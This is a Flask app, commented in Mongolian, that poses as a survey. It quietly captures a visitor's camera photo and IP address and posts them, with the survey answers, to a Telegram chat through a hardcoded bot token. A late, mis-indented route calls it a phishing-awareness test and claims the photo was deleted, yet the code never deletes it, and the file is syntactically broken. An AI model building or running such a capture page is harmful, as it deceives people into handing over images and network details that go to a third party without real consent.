# app.py - СУДАЛГАА БА ЗУРАГ ТЕЛЕГРАМ РУУ ИЛГЭЭХ БҮРЭН КОД
import requests
import base64
import os
import time # Шаардлагатай
from flask import Flask, request, jsonify, render_template, redirect, url_for

# ====================================================================
# ⚠️ 1. ТАНЫ ТОХИРГОО ⚠️
# ====================================================================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8476306576:AAFIzHzOLDQR_qOKb5yn4eK6VsMmIrGdy_Q')
CHAT_ID = os.environ.get('CHAT_ID', '-5036234831')
UPLOAD_FOLDER = 'captured_images'
# ====================================================================

app = Flask(__name__)

# Зураг хадгалах хавтас үүсгэх
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER) # Зөвхөн 4 Space (эсвэл Tab) ашиглана

# ----------------- sendPhoto ЧАДВАРТАЙ ФУНКЦ -----------------
def send_telegram_media_notification(message_text, image_filepath=None):
    """Текст болон зургийг хамт Telegram API руу илгээх функц"""
    
    if image_filepath and os.path.exists(image_filepath):
        TELEGRAM_PHOTO_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
        payload = {
            'chat_id': CHAT_ID, 
            'caption': message_text, 
            'parse_mode': 'Markdown'
        }
        files = {'photo': open(image_filepath, 'rb')}
        
        try:
            response = requests.post(TELEGRAM_PHOTO_API_URL, data=payload, files=files)
            response.raise_for_status()
            print("Telegram-д зураг болон текст амжилттай илгээгдлээ.")
            return True
        except requests.exceptions.RequestException as e:
            print(f"Telegram API руу зураг илгээх алдаа: {e}")
            return False
    else:
        TELEGRAM_MESSAGE_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        payload_text_only = {
            'chat_id': CHAT_ID, 
            'text': message_text, 
            'parse_mode': 'Markdown'
        }
        try:
            response = requests.post(TELEGRAM_MESSAGE_API_URL, json=payload_text_only)
            response.raise_for_status()
            print("Telegram-д зөвхөн текст амжилттай илгээгдлээ.")
            return True
        except requests.exceptions.RequestException as e:
            print(f"Telegram API руу зөвхөн текст илгээх алдаа: {e}")
            return False


# ----------------- Үндсэн Вэб Хаяг -----------------
@app.route('/')
def index():
    return render_template('index.html') 

# ----------------- Амжилттай Илгээсэн Хуудас -----------------
@app.route('/success')
def success():
    """Амжилттай илгээсэн хуудас (Хэрэглэгчийн харах хуудас)."""
    return """
    <div style='text-align: center; padding: 50px; font-family: Arial;'>
        <h1 style='color: green;'>✅ Баярлалаа!</h1>
        <p style='font-size: 18px;'>Таны хариулт амжилттай илгээгдлээ. Бид таны саналд талархаж байна.</p>
        <p style='margin-top: 20px; color: #666;'>Та энэ хуудсыг хааж болно.</p>
    </div>
    """

# ----------------- Өгөгдөл Хүлээн Авах API -----------------
@app.route('/submit', methods=['POST'])
def submit():
    role_department = request.form.get('role_department', 'Хариулаагүй')
    profession = request.form.get('profession', 'Хариулаагүй')
    photo_data = request.form.get('photo_data', '') # Хоосон текст авах
    
    image_filepath = None

    # Зураг ирсэн эсэхийг маш сайн шалгах
    if photo_data and ',' in photo_data:
        try:
            # Зөвхөн хэрэгтэй дата хэсгийг салгах
            encoded_data = photo_data.split(',')[1]
            image_data = base64.b64decode(encoded_data)
            
            filename = f"capture_{int(time.time())}.jpg"
            image_filepath = os.path.join(UPLOAD_FOLDER, filename)
            
            with open(image_filepath, 'wb') as f:
                f.write(image_data)
            print(f"Зураг хадгалагдлаа: {image_filepath}")
        except Exception as e:
            print(f"Зургийн алдаа: {e}")
            image_filepath = None

    # Мессеж бэлдэх
    message = (
        f"📋 ШИНЭ ХАРИУЛТ (УТАСНААС):\n\n"
        f"👤 Мэргэжил: {role_department}\n"
        f"💼 Ажилсан жил: {profession}\n\n"
        f"📍 IP: {request.remote_addr}"
    )
    
    # Telegram руу илгээх (Зураг алдаатай байсан ч текстийг заавал илгээнэ)
        send_telegram_media_notification(message, image_filepath=image_filepath)
    @app.route('/success')
    def success():
    return """
    <div style='text-align: center; padding: 40px; font-family: sans-serif; background-color: #fff4f4;'>
        <h1 style='color: #d9534f;'>⚠️ ТА СОНОР СЭРЭМЖИЙН ТЕСТЭД УНАЛАА!</h1>
        <p style='font-size: 18px;'>Та дөнгөж сая танихгүй линк дээр дарж, өөрийн мэдээллийг илгээлээ.</p>
        <div style='background: white; display: inline-block; padding: 20px; border-radius: 10px; text-align: left; border: 1px solid #ddd;'>
            <b>Аюулгүй байдлын зөвлөгөө:</b><br>
            1. Линк дээр дарахаас өмнө хаягийг нь шалга (onrender.com гэх мэт).<br>
            2. Камерын зөвшөөрөл нэхэж байвал сэжиглэ.<br>
        </div>
        <p style='margin-top: 20px; color: #666;'>Энэ бол зөвхөн сургалтын зориулалттай туршилт байлаа. Таны зургийг устгасан болно.</p>
    </div>
    """
    return redirect(url_for('success'))
    
if __name__ == '__main__':
    # Local туршилтад зориулав
    app.run(port=8080, debug=True)